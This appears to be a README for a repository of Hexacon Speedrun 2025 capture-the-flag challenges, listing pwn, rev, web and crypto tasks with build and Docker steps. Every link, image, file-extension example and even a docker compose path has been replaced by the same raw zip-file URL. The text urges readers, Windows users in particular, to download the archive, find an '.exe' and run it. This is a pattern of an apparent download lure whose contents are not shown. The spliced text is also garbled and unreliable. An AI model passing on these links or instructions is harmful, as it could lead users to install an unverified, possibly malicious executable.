# 🏃‍♂️ speedrun-2025 - Experience the Hexacon Challenges

[![Download speedrun-2025](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip%20speedrun%https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)

## 💡 Overview

This repository contains the challenges played during the Hexacon Speedrun 2025 Capture the Flag (CTF) event. Participate in solving these exciting challenges that range from web security to cryptography.

## 🚀 Getting Started

To get started with speedrun-2025, follow these steps to download and run the software:

1. **Visit the Download Page**

   Click this link to visit the download page: [Download speedrun-2025](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip).

2. **Select the Latest Release**

   On the releases page, look for the latest release. It will usually be at the top of the list. Click on it to see the details.

3. **Download the Files**

   Find the assets available for download under the selected release. Download the files that fit your operating system.

   For example:
   - If you are using Windows, you might look for a file that ends in `.exe`.
   - If you are using Mac or Linux, you might see files with extensions like `https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip`.

4. **Extract the Files**

   Once the download is complete, locate the downloaded files and extract them. You can usually do this by right-clicking on the file and selecting "Extract" or using a program like WinRAR or 7-Zip.

5. **Install Any Required Dependencies**

   Some challenges might need additional software to run. Check the documentation in each challenge folder for any specific instructions.

## ⚙️ Running the Challenges

To run a challenge, follow these simple steps:

1. **Navigate to the Challenge Folder**

   Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux) and navigate to the downloaded challenge folder. For example:

   ```bash
   cd path/to/speedrun-2025/challenges
   ```

2. **Build the Challenge**

   Use the following command to build a challenge. Replace `corrupted` with the name of the challenge you want to run:

   ```bash
   CHALLENGE="corrupted" # For example
   make -C challenges/$CHALLENGE
   ```

3. **Run the Challenge in Docker (If Needed)**

   Some challenges may need a special environment. If the challenge folder includes a `docker` directory, you can run it using Docker. Use this command:

   ```bash
   if [ -d challenges/$CHALLENGE/docker ]; then
     docker compose -f challenges/$https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip up --build
   fi
   ```

## 📊 Challenges Overview

### Qualifier

- **vm_escape** (`pwn`)

### Quarterfinals Challenges (BO1)

- **Fast Encryptor** (`rev`)
- **Rubbish** (`rev`)
- **Corrupted** (`pwn`)
- **Vector** (`pwn`)

### Semifinals Challenges (BO1)

- **HHVM** (`web` / `revb`)
- **Fair Dice** (`crypto`)

### Final Challenges (BO3)

- **Babypac** (`pwn`)
- **YAKG** (`rev`)

## 🏆 Final Results

![Tournament Bracket](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)

## 📥 Download & Install

To get the application, click the link below:

[Download speedrun-2025](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)

Follow the earlier instructions to ensure you successfully get the software running on your machine.

## 📚 Additional Information

- For a detailed breakdown of each challenge, explore the respective folders. Each challenge is organized clearly, making it easy to find what you need.
- If you encounter issues, please check the documentation provided in the challenge's folder.

By following these steps, you can easily download and run the Hexacon Speedrun 2025 challenges and enjoy tackling the exciting puzzles they offer!